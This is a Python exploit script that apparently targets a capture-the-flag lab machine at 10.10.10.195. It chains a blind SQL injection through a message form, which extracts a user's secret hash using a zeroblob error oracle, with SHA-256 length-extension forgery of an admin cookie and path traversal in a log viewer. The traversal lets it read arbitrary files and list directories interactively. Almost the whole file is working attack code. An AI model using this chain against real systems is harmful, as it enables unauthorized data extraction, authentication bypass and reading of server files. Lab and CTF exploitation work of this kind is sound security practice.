#!/usr/bin/env python3
import requests, re, os, codecs
from sys import stdout
from hashlib import sha256
from string import hexdigits
from base64 import b64decode, b64encode
from hashpumpy import hashpump
from binascii import unhexlify

proxies = {'http':'localhost:8080'}

# Print logo
def print_logo():
    print("""

    

    """)


# Clear screen
def clear(num=1):
    for i in range(num):
        stdout.write("\033[F")
        stdout.write("\033[K")


# Inject payload into send message
def inject(payload):
    #print(f"[DEBUG]\ninsert into messages values ('{payload}')")
    data = {'message':payload}
    try:
        r = requests.post('http://10.10.10.195/submitmessage', data=data) #proxies=proxies)
        if r.status_code != 500:
            #print(r.text) # Print response
            if "OK" not in r.text and "blob too big" in r.text: # Error occured --> check if error because of zeroblob
                # Valid char found
                return True
        # Error or not valid char
        return False
    except:
        return False


# Use the sqli to get the secret of user
def get_secret(user="admin"):
    try:
        print(f"[*] Trying to get secret of user {user}...")
        hash = ''
        chars = re.sub(r'[A-Z]', '', hexdigits) # Lower case hex-chars
        while len(hash) < 64: # SHA-256 hash
            for char in chars: # Test char-by-char
                print(f"[~] Trying {char}")
                                            #substr(string, index, length)                              #indices start at 1??!!
                query = f"' || (SELECT CASE substr((SELECT secret FROM users WHERE username=\"{user}\"),{len(hash)+1},1) WHEN \"{char}\" THEN zeroblob(999999999) ELSE 1 END)); -- -"
                if inject(query): # Valid char found
                    clear(2)
                    hash += char # Add valid char to hash string
                    print(f"[{len(hash)/64*100:0.2f}%] Got part of hash: {hash}")
                    break
                else:
                    clear()
        print(f"[+] Got hash from user {user}:\n{hash}")
        return hash
    except Exception as ex:
        print(f"[-] {ex}")


# Get a sample cookie for the signature
def get_cookie():
    print("[!] Getting sample cookie...")
    session = requests.Session()
    data = {'username':'guest','password':'guest'}
    session.post("http://10.10.10.195/postlogin",data=data)
    cookies = session.cookies.get_dict()
    if cookies["auth"]:
        clear()
        print(f"[+] Got sample cookie: {cookies['auth']}")
        return cookies["auth"]


# Forge the admin cookie
def forge_cookie(sample_cookie,hash):
    clear()
    print("[*] Forging admin cookie...")
    b64_data, b64_sig = sample_cookie.split('.')
    
    data = b64decode(b64_data).decode() # Cookie data
    sig = b64decode(b64_sig).hex() # Signature
    append = f';username=admin;secret={hash};' # Data to append
    
    for key_length in range(8,15): # Secret is between 8 and 15 bytes
        # Use hashpump to append our data to the cookie, without changing the signature
        new_sig, msg = hashpump(sig, data, append, key_length)
        
        # Generate cookie
        cookie_data = f"{b64encode(msg).decode()}.{b64encode(unhexlify(new_sig)).decode()}"
        cookie = {'auth' : cookie_data}

        # Check if cookie is valid for admin endpoint
        if verify_cookie(cookie):
            return cookie

    """
    # !OLD CODE!
    # Using the hash_extender program and regex parsing the data to generate the cookie...

    # Execute hash_extender and parse output
    cmd = f"/opt/hash_extender/hash_extender --data '{data}' --secret-min 8 --secret-max 15 --signature '{sig}' --format sha256 --append ';username=admin;secret={hash};'"
    print(cmd)
    quit()
    process = os.popen(cmd)
    output = process.read()

    # https://stackoverflow.com/questions/5323703/regex-how-to-match-sequence-of-key-value-pairs-at-end-of-string
    regex = re.compile(r'''
    [N].*:+                # a key (any word followed by a colon)
    (?:
    \s                    # then a space in between
        (?!\S+:)\S+       # then a value (any word not followed by a colon)
    \s
    )                     # match multiple values if present
    ''', re.VERBOSE)

    matches = regex.findall(output)
    # Match value pairs
    pairs = list([match.strip().split(': ') for match in matches])
    sig = ""
    num = 0

    # Generate cookies from signature and data
    for key,value in pairs:
        num += 1
        if key == "New signature":
            # Parse signature from hex to base64
            sig = codecs.encode(codecs.decode(value, 'hex'), 'base64').decode().replace("\n","")
        else:
            # Data signature from hex to base64
            data = codecs.encode(codecs.decode(value, 'hex'), 'base64').decode().replace("\n","")
            
            # Generate cookie
            cookie_data = f"{data}.{sig}"
            cookie = {'auth' : cookie_data}

            # Log progress
            print(f"[{num}/{len(pairs)//2}] Trying: {cookie}")

            # Verify if cookie works
            if verify_cookie(cookie):
                return cookie
    """

# Verifies cookie after forging
def verify_cookie(cookie):
    r = requests.get('http://10.10.10.195/admin',cookies=cookie)#,proxies=proxies)
    if r.status_code != 403 and r.status_code != 500:
        #clear(3)
        print(f"[+] Got valid cookie: {cookie}")
        return True
    #clear(2)
    return False


# Try to get user.txt
def get_usertxt(cookie):
    print("[!] Trying to get user.txt...")
    data = {'logfile':'../../../../../../../home/user/user.txt'}
    r = requests.post('http://10.10.10.195/admin/log/view',cookies=cookie,data=data)#,proxies=proxies)
    if r.text != "":
        clear()
        print(f"[+] Got user.txt: {r.text}")


# Read file from system
def read_file(file,cookie):
    print(f"[*] Trying to read {file}...")
    data = {'logfile':f'../../../../../../../{file}'}
    r = requests.post('http://10.10.10.195/admin/log/view',cookies=cookie,data=data)#,proxies=proxies)
    if r.text != "":
        clear()
        print(f"[+] Got contents of {file}:\n{r.text}")


# List directory from system
def list_dir(dir,cookie):
    data = {'logdir':f'../../../../../../../{dir}'}
    r = requests.post('http://10.10.10.195/admin/log/dir',cookies=cookie,data=data)#,proxies=proxies)
    if r.text != "":
        clear()
        dir_list = r.text.strip("'")
        print(f"[+] Got contents of {dir}:\n{dir_list}")


# Main function
def main():
    print_logo()
    admin_hash = "f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105"
    #admin_hash = get_secret()
    cookie = forge_cookie(get_cookie(), admin_hash)

    if cookie:
        get_usertxt(cookie)
        while True:
            try:
                print("[1] - List dir")
                print("[2] - Read file")
                option = input("Option> ")
                if option.strip() == "1":
                    dir = input("dir-path> ")
                    list_dir(dir,cookie)
                else:
                    file = input("file-path> ")
                    read_file(file,cookie)
            except KeyboardInterrupt:
                break
            except:
                pass
    else:
        print(f"[-] Could not get a valid admin-cookie!")


if __name__ == "__main__":
    main()